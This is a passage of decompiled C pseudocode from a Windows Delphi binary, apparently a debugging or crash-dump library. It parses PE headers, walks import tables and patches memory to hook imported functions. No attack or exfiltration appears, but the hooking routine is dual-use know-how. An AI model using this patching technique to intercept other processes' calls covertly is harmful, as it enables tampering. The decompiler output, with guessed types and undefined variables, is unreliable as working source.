// 466A28: using guessed type int (__stdcall *dword_466A28)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 46807C: using guessed type int *off_46807C[2];
// 4681D4: using guessed type char *off_4681D4;

//----- (0042A200) --------------------------------------------------------
int __fastcall sub_42A200(char a1, signed int a2, __int32 a3)
{
  _DWORD v4[4]; // [esp-Ch] [ebp-38h] BYREF
  int v5; // [esp+4h] [ebp-28h] BYREF
  int v6; // [esp+8h] [ebp-24h] BYREF
  int v7; // [esp+Ch] [ebp-20h] BYREF
  int v8; // [esp+10h] [ebp-1Ch] BYREF
  __int32 v9; // [esp+14h] [ebp-18h] BYREF
  int v10; // [esp+18h] [ebp-14h] BYREF
  signed int i; // [esp+1Ch] [ebp-10h]
  signed int v12; // [esp+20h] [ebp-Ch]
  signed int v13; // [esp+24h] [ebp-8h]
  __int32 v14; // [esp+28h] [ebp-4h] BYREF
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  v12 = _InterlockedExchange(&v14, a3);
  v13 = a2;
  HIBYTE(v14) = a1;
  v4[2] = &savedregs;
  v4[1] = &loc_42A317;
  v4[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_4238F0(&v9);
  for ( i = 0; i <= 1000; ++i )
  {
    sub_415150(i, &v8);
    sub_4079F0(&v10, 3);
    if ( v13 > 0 )
    {
      sub_415150(v13, &v7);
      sub_4079F0(&v10, 3);
    }
    if ( v12 > 0 )
    {
      sub_415150(v12, &v6);
      sub_4079F0(&v10, 3);
    }
    sub_415150(HIBYTE(v14), &v5);
    sub_4079F0(&v10, 4);
    if ( !(unsigned __int8)sub_426B00(v10) )
      break;
  }
  sub_42A0C0(v10);
  __writefsdword(0, (unsigned int)L".dmp");
  return sub_406CA4((int)&v5, 6);
}
// 42A388: using guessed type wchar_t aDmp[5];

//----- (0042A3A0) --------------------------------------------------------
void sub_42A3A0()
{
  ++unk_46EB84;
}

//----- (0042A700) --------------------------------------------------------
bool __fastcall sub_42A700(int a1)
{
  return a1 < 0;
}

//----- (0042A720) --------------------------------------------------------
int __fastcall sub_42A720(int result)
{
  return (unsigned __int16)result;
}

//----- (0042A740) --------------------------------------------------------
int __fastcall sub_42A740(int a1)
{
  int v2; // [esp+4h] [ebp-8h]

  v2 = 0;
  if ( a1 )
    return *(_DWORD *)a1;
  return v2;
}

//----- (0042A770) --------------------------------------------------------
char __fastcall sub_42A770(void *a1, const void *a2, SIZE_T a3)
{
  HANDLE hProcess; // [esp+0h] [ebp-18h]
  DWORD flOldProtect; // [esp+4h] [ebp-14h] BYREF
  char v6; // [esp+Bh] [ebp-Dh]
  SIZE_T dwSize; // [esp+Ch] [ebp-Ch]
  const void *v8; // [esp+10h] [ebp-8h]
  LPVOID lpAddress; // [esp+14h] [ebp-4h]

  dwSize = a3;
  v8 = a2;
  lpAddress = a1;
  v6 = 0;
  if ( a1 )
  {
    if ( v8 )
    {
      if ( dwSize )
      {
        flOldProtect = 0;
        hProcess = GetCurrentProcess();
        if ( VirtualProtect(lpAddress, dwSize, 4u, &flOldProtect) )
        {
          sub_40C8C8(lpAddress, v8, dwSize);
          VirtualProtect(lpAddress, dwSize, flOldProtect, &flOldProtect);
          FlushInstructionCache(hProcess, lpAddress, dwSize);
          return 1;
        }
      }
    }
  }
  return v6;
}

//----- (0042A820) --------------------------------------------------------
int __cdecl sub_42A820(int a1)
{
  int result; // eax

  result = a1;
  if ( *(_DWORD *)(a1 - 4) )
  {
    *(_DWORD *)(*(_DWORD *)(a1 - 8) + 8) = *(_DWORD *)(a1 - 4);
    result = *(_DWORD *)(*(_DWORD *)(a1 - 8) + 8);
    if ( *(_WORD *)result == 23117 )
    {
      *(_DWORD *)(*(_DWORD *)(a1 - 8) + 12) = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a1 - 8) + 8) + 60)
                                            + *(_DWORD *)(*(_DWORD *)(a1 - 8) + 8);
      result = *(_DWORD *)(*(_DWORD *)(a1 - 8) + 12);
      if ( *(_DWORD *)result == 17744 )
      {
        result = *(unsigned __int16 *)(*(_DWORD *)(*(_DWORD *)(a1 - 8) + 12) + 20);
        if ( result == 224 )
        {
          result = *(_DWORD *)(*(_DWORD *)(a1 - 8) + 12);
          if ( *(_WORD *)(result + 24) == 267 )
          {
            result = *(_DWORD *)(a1 - 4);
            *(_DWORD *)(*(_DWORD *)(a1 - 8) + 4) = result;
          }
        }
      }
    }
  }
  return result;
}

//----- (0042A8C0) --------------------------------------------------------
_DWORD *__fastcall sub_42A8C0(_DWORD *a1, char a2)
{
  char v3; // [esp+3h] [ebp-9h]
  _DWORD *v4; // [esp+4h] [ebp-8h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  if ( a2 )
    a1 = (_DWORD *)System::__linkproc__ ClassCreate();
  v3 = a2;
  v4 = a1;
  sub_42A820((int)&savedregs);
  if ( !v4[1] )
  {
    v4[2] = 0;
    v4[3] = 0;
  }
  if ( v3 )
    System::__linkproc__ AfterConstruction(v4);
  return v4;
}
// 42A8D5: variable 'a2' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);

//----- (0042A920) --------------------------------------------------------
char __fastcall sub_42A920(
        int a1,
        int a2,
        int a3,
        int a4,
        unsigned __int8 (__fastcall *a5)(int, int, int, int, int, int, int, int, int))
{
  int v5; // ecx
  bool v7; // [esp+3h] [ebp-29h]
  int AsTTimeStamp; // [esp+4h] [ebp-28h]
  int v9; // [esp+8h] [ebp-24h]
  int v10; // [esp+Ch] [ebp-20h]
  int v11; // [esp+10h] [ebp-1Ch]
  int v12; // [esp+14h] [ebp-18h]
  int v13; // [esp+1Ch] [ebp-10h]
  char v14; // [esp+23h] [ebp-9h]

  v14 = 0;
  v13 = sub_42ACE0(a1, *(_DWORD *)(*(_DWORD *)(a1 + 12) + 224));
  if ( !v13 || !*(_DWORD *)(*(_DWORD *)(a1 + 12) + 228) )
    return 1;
  while ( *(_DWORD *)(v13 + 8) )
  {
    v7 = (*(_BYTE *)v13 & 1) != 0;
    if ( (*(_BYTE *)v13 & 1) != 0 )
    {
      AsTTimeStamp = sub_42ACE0(a1, *(_DWORD *)(v13 + 4));
      v12 = sub_42ACE0(a1, *(_DWORD *)(v13 + 16));
      v11 = sub_42ACE0(a1, *(_DWORD *)(v13 + 12));
      v10 = sub_42ACE0(a1, *(_DWORD *)(v13 + 20));
      v9 = sub_42ACE0(a1, *(_DWORD *)(v13 + 24));
    }
    else
    {
      AsTTimeStamp = Iddatetimestamp::TIdDateTimeStamp::GetAsTTimeStamp(*(Iddatetimestamp::TIdDateTimeStamp **)(v13 + 4));
      v12 = Iddatetimestamp::TIdDateTimeStamp::GetAsTTimeStamp(*(Iddatetimestamp::TIdDateTimeStamp **)(v13 + 16));
      v11 = Iddatetimestamp::TIdDateTimeStamp::GetAsTTimeStamp(*(Iddatetimestamp::TIdDateTimeStamp **)(v13 + 12));
      v10 = Iddatetimestamp::TIdDateTimeStamp::GetAsTTimeStamp(*(Iddatetimestamp::TIdDateTimeStamp **)(v13 + 20));
      v9 = Iddatetimestamp::TIdDateTimeStamp::GetAsTTimeStamp(*(Iddatetimestamp::TIdDateTimeStamp **)(v13 + 24));
    }
    LOBYTE(v5) = v7;
    if ( !a5(a4, a1, v5, AsTTimeStamp, v12, v11, v10, v9, a2) )
      return v14;
    v13 += 32;
  }
  return 1;
}
// 42AA3D: variable 'v5' is possibly undefined

//----- (0042AA70) --------------------------------------------------------
char __fastcall sub_42AA70(
        int a1,
        int a2,
        int a3,
        int a4,
        unsigned __int8 (__fastcall *a5)(int, int, int, int, int, int))
{
  int v6; // [esp+0h] [ebp-20h]
  int v7; // [esp+4h] [ebp-1Ch]
  int v8; // [esp+8h] [ebp-18h]
  int *v9; // [esp+Ch] [ebp-14h]
  unsigned int v10; // [esp+10h] [ebp-10h]
  char v11; // [esp+17h] [ebp-9h]

  v11 = 0;
  v10 = *(_DWORD *)(*(_DWORD *)(a1 + 12) + 132);
  v9 = (int *)sub_42ACE0(a1, *(_DWORD *)(*(_DWORD *)(a1 + 12) + 128));
  if ( !v9 || v10 < 0x14 )
    return 1;
  while ( v9[4] )
  {
    v8 = sub_42ACE0(a1, v9[3]);
    v7 = sub_42ACE0(a1, *v9);
    v6 = sub_42ACE0(a1, v9[4]);
    if ( !a5(a4, a1, v8, v7, v6, a2) )
      return v11;
    v9 += 5;
  }
  return 1;
}

//----- (0042AB20) --------------------------------------------------------
char __fastcall sub_42AB20(
        int a1,
        char a2,
        int a3,
        int a4,
        unsigned __int8 (__fastcall *a5)(int, int, int, _DWORD, _WORD *, _DWORD, int, int),
        int *a6,
        int a7,
        int a8,
        int a9,
        int a10)
{
  unsigned __int16 *AsTTimeStamp; // [esp+0h] [ebp-1Ch]
  unsigned __int16 v12; // [esp+4h] [ebp-18h]
  unsigned __int16 v13; // [esp+6h] [ebp-16h]
  _WORD *v14; // [esp+8h] [ebp-14h]
  char v15; // [esp+Fh] [ebp-Dh]

  v15 = 0;
  if ( a6 )
  {
    while ( a6 && *a6 )
    {
      v14 = 0;
      v13 = 0;
      v12 = 0;
      if ( sub_42A700(*a6) )
      {
        v13 = sub_42A720(*a6);
      }
      else
      {
        if ( a2 )
          AsTTimeStamp = (unsigned __int16 *)sub_42ACE0(a1, *a6);
        else
          AsTTimeStamp = (unsigned __int16 *)Iddatetimestamp::TIdDateTimeStamp::GetAsTTimeStamp((Iddatetimestamp::TIdDateTimeStamp *)*a6);
        v14 = AsTTimeStamp + 1;
        v12 = *AsTTimeStamp;
      }
      if ( !a5(a4, a1, a3, v13, v14, v12, a7, a10) )
        return v15;
      ++a6;
      a7 += 4;
    }
    return 1;
  }
  return v15;
}

//----- (0042AC00) --------------------------------------------------------
char __fastcall sub_42AC00(
        int a1,
        int a2,
        int *a3,
        int a4,
        int (__fastcall *a5)(int, int, int, int, unsigned __int16 *, _DWORD, int, int),
        int a6,
        int a7)
{
  char v7; // al
  unsigned __int16 *v9; // [esp+0h] [ebp-20h]
  int v10; // [esp+8h] [ebp-18h]
  char v11; // [esp+13h] [ebp-Dh]
  int *v12; // [esp+14h] [ebp-Ch]

  v12 = a3;
  v11 = 0;
  if ( a3 )
  {
    while ( v12 && *v12 )
    {
      if ( sub_42A700(*v12) )
      {
        v10 = sub_42A720(*v12);
        v7 = a5(a4, a1, a2, v10, 0, 0, a6, a7);
      }
      else
      {
        v9 = (unsigned __int16 *)sub_42ACE0(a1, *v12);
        v7 = a5(a4, a1, a2, 0, v9 + 1, *v9, a6, a7);
      }
      if ( !v7 )
        return v11;
      ++v12;
      a6 += 4;
    }
    return 1;
  }
  return v11;
}

//----- (0042ACC0) --------------------------------------------------------
bool __fastcall sub_42ACC0(int a1)
{
  return *(_DWORD *)(a1 + 4) != 0;
}

//----- (0042ACE0) --------------------------------------------------------
int __fastcall sub_42ACE0(int a1, int a2)
{
  if ( a2 )
    return a2 + *(_DWORD *)(a1 + 4);
  else
    return 0;
}

//----- (0042AD20) --------------------------------------------------------
char __fastcall sub_42AD20(int a1, int a2, char a3, _BYTE *a4, int *a5, int a6, int a7, int a8, int a9)
{
  char v9; // zf
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v12; // [esp-8h] [ebp-20h]
  int *v13; // [esp-4h] [ebp-1Ch]
  void *v14; // [esp+0h] [ebp-18h]
  int v15[2]; // [esp+4h] [ebp-14h] BYREF
  int v16; // [esp+Ch] [ebp-Ch] BYREF
  char v17; // [esp+12h] [ebp-6h]
  char v18; // [esp+13h] [ebp-5h]
  int v19; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v15[0] = 0;
  v16 = 0;
  v18 = a3;
  v15[1] = a2;
  v19 = a1;
  v13 = &savedregs;
  v12 = &loc_42ADCC;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v17 = 1;
  sub_407248(&v16, a4, 0, (unsigned __int16)ExceptionList);
  sub_4244F0((_BYTE *)v16, (unsigned __int8 **)v15);
  sub_4070CC(&v16, v15[0]);
  sub_407478(v16, *(_DWORD *)(v19 + 16));
  if ( v9 )
    v17 = sub_42AB20(
            v19,
            v18,
            (int)a4,
            v19,
            (unsigned __int8 (__fastcall *)(int, int, int, _DWORD, _WORD *, _DWORD, int, int))sub_42AEA0,
            a5,
            a6,
            a7,
            a8,
            a9);
  __writefsdword(0, (unsigned int)v12);
  v14 = &loc_42ADD3;
  sub_406C68(v15);
  sub_406C68(&v16);
  return v17;
}
// 42AD7E: variable 'v9' is possibly undefined

//----- (0042ADE0) --------------------------------------------------------
char __fastcall sub_42ADE0(int a1, int a2, _BYTE *a3, int *a4, int a5, int a6)
{
  char v6; // zf
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-28h] BYREF
  void *v9; // [esp-8h] [ebp-24h]
  int *v10; // [esp-4h] [ebp-20h]
  void *v11; // [esp+0h] [ebp-1Ch]
  int v12[2]; // [esp+4h] [ebp-18h] BYREF
  int v13; // [esp+Ch] [ebp-10h] BYREF
  char v14; // [esp+13h] [ebp-9h]
  int v15; // [esp+14h] [ebp-8h]
  int v16; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v12[0] = 0;
  v13 = 0;
  v15 = (int)a3;
  v12[1] = a2;
  v16 = a1;
  v10 = &savedregs;
  v9 = &loc_42AE80;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v14 = 1;
  sub_407248(&v13, a3, 0, (unsigned __int16)ExceptionList);
  sub_4244F0((_BYTE *)v13, (unsigned __int8 **)v12);
  sub_4070CC(&v13, v12[0]);
  sub_407478(v13, *(_DWORD *)(v16 + 16));
  if ( v6 )
    v14 = sub_42AC00(
            v16,
            v15,
            a4,
            v16,
            (int (__fastcall *)(int, int, int, int, unsigned __int16 *, _DWORD, int, int))sub_42AEA0,
            a5,
            a6);
  __writefsdword(0, (unsigned int)v9);
  v11 = &loc_42AE87;
  sub_406C68(v12);
  sub_406C68(&v13);
  return v14;
}
// 42AE3E: variable 'v6' is possibly undefined

//----- (0042AEA0) --------------------------------------------------------
char __fastcall sub_42AEA0(int a1, int a2, int a3, int a4, _BYTE *a5, int a6, void *a7, _BYTE *a8)
{
  char v8; // zf
  int v9; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-30h] BYREF
  void *v12; // [esp-8h] [ebp-2Ch]
  int *v13; // [esp-4h] [ebp-28h]
  void *v14; // [esp+0h] [ebp-24h]
  int v15[3]; // [esp+4h] [ebp-20h] BYREF
  int v16; // [esp+10h] [ebp-14h]
  int v17; // [esp+14h] [ebp-10h] BYREF
  _DWORD *v18; // [esp+18h] [ebp-Ch]
  char v19; // [esp+1Fh] [ebp-5h]
  int v20; // [esp+20h] [ebp-4h]
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v15[0] = 0;
  v17 = 0;
  v15[1] = a3;
  v15[2] = a2;
  v20 = a1;
  v13 = &savedregs;
  v12 = &loc_42B021;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v19 = 1;
  if ( a5 )
    sub_407248(&v17, a5, 0, (unsigned __int16)ExceptionList);
  else
    sub_406C68(&v17);
  sub_4244F0((_BYTE *)v17, (unsigned __int8 **)v15);
  sub_4070CC(&v17, v15[0]);
  if ( *(_DWORD *)(v20 + 20) )
  {
    sub_407478(v17, *(_DWORD *)(v20 + 20));
    if ( !v8 )
      goto LABEL_11;
  }
  else if ( *(_DWORD *)(v20 + 24) != a4 )
  {
    goto LABEL_11;
  }
  v18 = a8;
  a8[4] = 1;
  v16 = System::__linkproc__ LStrLen(v18[2]);
  System::__linkproc__ DynArraySetLength(v16 + 1);
  v9 = sub_42A740((int)a7);
  *(_DWORD *)(v18[2] + 12 * v16) = v9;
  *(_DWORD *)(v18[2] + 12 * v16 + 4) = *v18;
  *(_DWORD *)(v18[2] + 12 * v16 + 8) = a7;
  if ( *(_DWORD *)(v18[2] + 12 * v16) != *(_DWORD *)(v18[2] + 12 * v16 + 4) && !sub_42A770(a7, v18, 4u) )
  {
    v19 = 0;
    System::__linkproc__ DynArraySetLength(v16);
    *((_BYTE *)v18 + 4) = 0;
  }
LABEL_11:
  __writefsdword(0, (unsigned int)v12);
  v14 = &loc_42B028;
  sub_406C68(v15);
  sub_406C68(&v17);
  return v19;
}
// 42AF17: variable 'v8' is possibly undefined
// 408670: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);

//----- (0042B210) --------------------------------------------------------
int __usercall sub_42B210@<eax>(int a1@<ebp>)
{
  return a1;
}

//----- (0042B220) --------------------------------------------------------
void **sub_42B220()
{
  void *retaddr; // [esp+0h] [ebp+0h] BYREF

  return &retaddr;
}
// 42B220: returning address of temporary local variable '%" r"'

//----- (0042B230) --------------------------------------------------------
struct _EXCEPTION_REGISTRATION_RECORD *sub_42B230()
{
  return NtCurrentTeb()->NtTib.ExceptionList;
}

//----- (0042B240) --------------------------------------------------------
PVOID sub_42B240()
{
  return NtCurrentTeb()->NtTib.StackBase;
}

//----- (0042B250) --------------------------------------------------------
void sub_42B250()
{
  ;
}

//----- (0042B260) --------------------------------------------------------
PVOID __fastcall sub_42B260(LPCVOID lpAddress)
{
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+0h] [ebp-20h] BYREF

  Buffer.AllocationBase = 0;
  VirtualQuery_0(lpAddress, &Buffer, 0x1Cu);
  if ( Buffer.State == 4096 )
    return Buffer.AllocationBase;
  else
    return 0;
}

//----- (0042B2A0) --------------------------------------------------------
int __fastcall sub_42B2A0(int a1)
{
  int v1; // ecx
  _DWORD *v2; // edx

  v1 = 0;
  if ( a1 )
  {
    v2 = (_DWORD *)*off_46815C;
    if ( *off_46815C )
    {
      while ( a1 != v2[1] )
      {
        v2 = (_DWORD *)*v2;
        if ( !v2 )
          return v1;
      }
      LOBYTE(v1) = 1;
    }
  }
  return v1;
}
// 46815C: using guessed type int *off_46815C;

//----- (0042B2D0) --------------------------------------------------------
int __cdecl sub_42B2D0(int a1)
{
  int result; // eax

  if ( *(_DWORD *)(a1 - 4) )
  {
    UnmapViewOfFile(*(LPCVOID *)(a1 - 4));
    *(_DWORD *)(a1 - 4) = 0;
  }
  if ( *(_DWORD *)(a1 - 8) )
  {
    CloseHandle_0(*(HANDLE *)(a1 - 8));
    *(_DWORD *)(a1 - 8) = 0;
  }
  result = a1;
  if ( *(_DWORD *)(a1 - 12) != -1 )
  {
    CloseHandle_0(*(HANDLE *)(a1 - 12));
    result = a1;
    *(_DWORD *)(a1 - 12) = -1;
  }
  return result;
}

//----- (0042B330) --------------------------------------------------------
int __fastcall sub_42B330(int a1, char a2)
{
  int v3; // edi
  DWORD v4; // ebx
  DWORD v5; // esi
  int FileSize; // eax
  int v7; // edx
  HANDLE hFile; // [esp+Ch] [ebp-Ch]
  HANDLE hFileMappingObject; // [esp+10h] [ebp-8h]
  LPVOID v11; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v3 = 0;
  hFile = (HANDLE)sub_415710(a1, a2);
  if ( hFile != (HANDLE)-1 )
  {
    if ( (a2 & 0xF) == 2 )
    {
      v4 = 8;
      v5 = 1;
    }
    else
    {
      v4 = 2;
      v5 = 4;
    }
    hFileMappingObject = CreateFileMappingW(hFile, 0, v4, 0, 0, 0);
    if ( hFileMappingObject
      && (v11 = MapViewOfFile(hFileMappingObject, v5, 0, 0, 0)) != 0
      && (FileSize = GetFileSize(hFile, 0), FileSize != -1) )
    {
      v7 = (int)v11;
      LOBYTE(v7) = 1;
      return Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(
               (Classes::TCustomMemoryStream *)&cls_DebugSysUtil_TFileMappingStream,
               v7,
               (int)hFile,
               (int)hFileMappingObject,
               v11,
               FileSize);
    }
    else
    {
      sub_42B2D0((int)&savedregs);
    }
  }
  return v3;
}
// 42B164: using guessed type int (*cls_DebugSysUtil_TFileMappingStream)();

//----- (0042B410) --------------------------------------------------------
int __fastcall sub_42B410(int a1, int a2, int (__fastcall *a3)(unsigned int, int), int a4, char a5)
{
  signed int v5; // esi
  int v6; // edi
  unsigned int v7; // ebx
  char v9; // [esp+1Fh] [ebp-15h]
  int v10; // [esp+20h] [ebp-14h]
  int v11; // [esp+24h] [ebp-10h]

  v11 = -1;
  if ( a1 )
  {
    v5 = 0;
    v6 = *(_DWORD *)(a1 - 4) - 1;
    v9 = 0;
    if ( v6 >= 0 )
    {
      do
      {
        v7 = (unsigned int)(v6 + v5) >> 1;
        v10 = a3(a1 + a2 * v7, a4);
        if ( v10 >= 0 )
        {
          v6 = v7 - 1;
          if ( !v10 )
          {
            v9 = 1;
            v5 = v7;
          }
        }
        else
        {
          v5 = v7 + 1;
        }
      }
      while ( v6 >= v5 );
    }
    if ( v9 )
    {
      return v5;
    }
    else if ( a5 && v6 >= 0 )
    {
      return v6;
    }
  }
  return v11;
}

//----- (0042B4C0) --------------------------------------------------------
int __usercall sub_42B4C0@<eax>(int a1@<eax>, int a2)
{
  return *(_DWORD *)(a2 - 4) + a1 * *(_DWORD *)(a2 - 8);
}

//----- (0042B4F0) --------------------------------------------------------
int __usercall sub_42B4F0@<eax>(int a1@<eax>, int a2@<edx>, int a3)
{
  char *v3; // ebx
  char *v4; // esi
  char v5; // al
  __int16 v6; // ax
  int v7; // eax
  int result; // eax
  int v9; // [esp+Ch] [ebp-18h]
  int v10; // [esp+10h] [ebp-14h]
  int v11; // [esp+14h] [ebp-10h]
  int v12; // [esp+18h] [ebp-Ch]

  v9 = *(_DWORD *)(a3 - 8);
  do
  {
    v12 = a1;
    v11 = a2;
    v10 = sub_42B4C0((unsigned int)(a2 + a1) >> 1, a3);
    do
    {
      v3 = (char *)sub_42B4C0(v12, a3);
      v4 = (char *)sub_42B4C0(v11, a3);
      while ( (*(int (__fastcall **)(char *, int))(a3 - 12))(v3, v10) < 0 )
      {
        ++v12;
        v3 += v9;
      }
      while ( (*(int (__fastcall **)(char *, int))(a3 - 12))(v4, v10) > 0 )
      {
        --v11;
        v4 -= v9;
      }
      if ( v12 <= v11 )
      {
        if ( v12 != v11 )
        {
          switch ( *(_DWORD *)(a3 - 8) )
          {
            case 1:
              v5 = *v3;
              *v3 = *v4;
              *v4 = v5;
              break;
            case 2:
              v6 = *(_WORD *)v3;
              *(_WORD *)v3 = *(_WORD *)v4;
              *(_WORD *)v4 = v6;
              break;
            case 4:
              v7 = *(_DWORD *)v3;
              *(_DWORD *)v3 = *(_DWORD *)v4;
              *(_DWORD *)v4 = v7;
              break;
            default:
              System::Move(v3, *(void **)(a3 - 16), *(_DWORD *)(a3 - 8));
              System::Move(v4, v3, *(_DWORD *)(a3 - 8));
              System::Move(*(const void **)(a3 - 16), v4, *(_DWORD *)(a3 - 8));
              break;
          }
        }
        if ( v3 == (char *)v10 )
        {
          v10 = (int)v4;
        }
        else if ( v4 == (char *)v10 )
        {
          v10 = (int)v3;
        }
        ++v12;
        --v11;
      }
    }
    while ( v12 <= v11 );
    if ( a1 < v11 )
      sub_42B4F0(a3);
    a1 = v12;
    result = v12;
  }
  while ( v12 < a2 );
  return result;
}

//----- (0042B660) --------------------------------------------------------
_DWORD *__fastcall sub_42B660(int a1, int a2, int a3)
{
  unsigned int v4[2]; // [esp-Ch] [ebp-28h] BYREF
  int *v5; // [esp-4h] [ebp-20h]
  int v6; // [esp+4h] [ebp-18h]
  int v7; // [esp+8h] [ebp-14h]
  int v8[2]; // [esp+Ch] [ebp-10h] BYREF
  int v9; // [esp+14h] [ebp-8h]
  int v10; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v8[0] = 0;
  v8[1] = a3;
  v9 = a2;
  v10 = a1;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_42B6EB;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_408B34(v8, (int)&byte_42B1D8);
  if ( v10 )
  {
    System::__linkproc__ DynArraySetLength(v9);
    v7 = v10;
    v6 = v10 - 4;
    sub_42B4F0(0, *(_DWORD *)(v10 - 4) - 1, (int)&savedregs);
  }
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_42B6F2;
  return sub_408B34(v8, (int)&byte_42B1D8);
}
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 42B1D8: using guessed type char byte_42B1D8;

//----- (0042B700) --------------------------------------------------------
bool __fastcall sub_42B700(LPCSTR lpString1, LPCSTR lpString2, int cchCount2, unsigned __int8 a4)
{
  return CompareStringA(0x400u, dwCmpFlags[a4], lpString1, cchCount2, lpString2, cchCount2) == 2;
}
// 466A30: using guessed type DWORD dwCmpFlags[2];

//----- (0042B740) --------------------------------------------------------
int __fastcall sub_42B740(int a1)
{
  if ( *(_BYTE *)(a1 + 8) )
    return sub_428270(*(_DWORD *)(a1 + 4));
  else
    return (*(int (__fastcall **)(_DWORD))(**(_DWORD **)(a1 + 4) + 8))(*(_DWORD *)(a1 + 4));
}

//----- (0042B760) --------------------------------------------------------
int __fastcall sub_42B760(int a1)
{
  return *(_DWORD *)(*(_DWORD *)(a1 + 4) + 8);
}

//----- (0042B770) --------------------------------------------------------
int __fastcall sub_42B770(int a1, char a2, char a3)
{
  char v3; // bl
  int v4; // esi
  char v6; // [esp+Bh] [ebp-1h]

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v3 = a3;
  v6 = a2;
  v4 = a1;
  sub_405568(a1, 0);
  *(_DWORD *)(v4 + 4) = sub_405568((int)cls_CrossPlatform_TList, 1);
  *(_BYTE *)(v4 + 8) = v3;
  if ( v6 )
    System::__linkproc__ AfterConstruction(v4);
  return v4;
}
// 42B782: variable 'a3' is possibly undefined
// 42B784: variable 'a2' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);
// 42296C: using guessed type int (*cls_CrossPlatform_TList[2])();

//----- (0042B7D0) --------------------------------------------------------
int sub_42B7D0()
{
  __int64 v0; // rax
  char v1; // bl
  int v2; // esi
  _DWORD *v3; // eax
  int result; // eax

  v0 = System::__linkproc__ BeforeDestruction();
  v1 = BYTE4(v0);
  v2 = v0;
  if ( *(_BYTE *)(v0 + 8) )
    sub_428270(*(_DWORD *)(v0 + 4));
  v3 = *(_DWORD **)(v2 + 4);
  *(_DWORD *)(v2 + 4) = 0;
  sub_405598(v3);
  result = sub_405588();
  if ( v1 > 0 )
    return System::__linkproc__ ClassDestroy(v2);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);

//----- (0042B880) --------------------------------------------------------
int sub_42B880()
{
  __int64 v0; // rax
  char v1; // bl
  int v2; // esi
  int result; // eax

  v0 = System::__linkproc__ BeforeDestruction();
  v1 = BYTE4(v0);
  v2 = v0;
  sub_42B8B0((Classes::TCustomMemoryStream *)v0);
  result = sub_405588();
  if ( v1 > 0 )
    return System::__linkproc__ ClassDestroy(v2);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);

//----- (0042B8B0) --------------------------------------------------------
int __fastcall sub_42B8B0(Classes::TCustomMemoryStream *this)
{
  const void *v2; // eax
  int result; // eax

  v2 = (const void *)*((_DWORD *)this + 1);
  if ( v2 )
  {
    UnmapViewOfFile(v2);
    Classes::TCustomMemoryStream::SetPointer(this, 0, 0);
  }
  if ( *((_DWORD *)this + 5) )
  {
    CloseHandle_0(*((HANDLE *)this + 5));
    *((_DWORD *)this + 5) = 0;
  }
  result = *((_DWORD *)this + 4);
  if ( result != -1 )
  {
    result = CloseHandle_0(*((HANDLE *)this + 4));
    *((_DWORD *)this + 4) = -1;
  }
  return result;
}

//----- (0042B900) --------------------------------------------------------
int __fastcall sub_42B900(__int64 (__fastcall ***this)(Classes::TStream *), const void *a2, int a3)
{
  int v5; // edi
  __int64 v6; // rax
  __int64 v8; // [esp+0h] [ebp-20h]
  char *v9; // [esp+14h] [ebp-Ch]
  __int64 (__fastcall **v10)(Classes::TStream *); // [esp+18h] [ebp-8h]

  v5 = 0;
  v8 = (**this)((Classes::TStream *)this);
  if ( a3 <= v8 - sub_427470(this) )
  {
    v10 = this[1];
    v9 = (char *)v10 + sub_427470(this);
    System::Move(a2, v9, a3);
    v6 = sub_427470(this);
    Classes::TStream::SetPosition((Classes::TStream *)this, v6 + a3);
    return a3;
  }
  return v5;
}

//----- (0042BBA0) --------------------------------------------------------
_DWORD *__fastcall sub_42BBA0(_DWORD *lp)
{
  _DWORD *v2; // esi

  v2 = 0;
  if ( !IsBadReadPtr(lp, 0x40u) && *(_WORD *)lp == 23117 )
  {
    if ( lp[15] )
    {
      v2 = (_DWORD *)((char *)lp + lp[15]);
      if ( IsBadReadPtr(v2, 0xF8u) || *v2 != 17744 )
        return 0;
    }
  }
  return v2;
}

//----- (0042BC00) --------------------------------------------------------
_DWORD *__fastcall sub_42BC00(_DWORD *lp)
{
  _DWORD *v2; // esi

  v2 = 0;
  if ( !IsBadReadPtr(lp, 0x40u) && *(_WORD *)lp == 23117 )
  {
    if ( lp[15] )
    {
      v2 = (_DWORD *)((char *)lp + lp[15]);
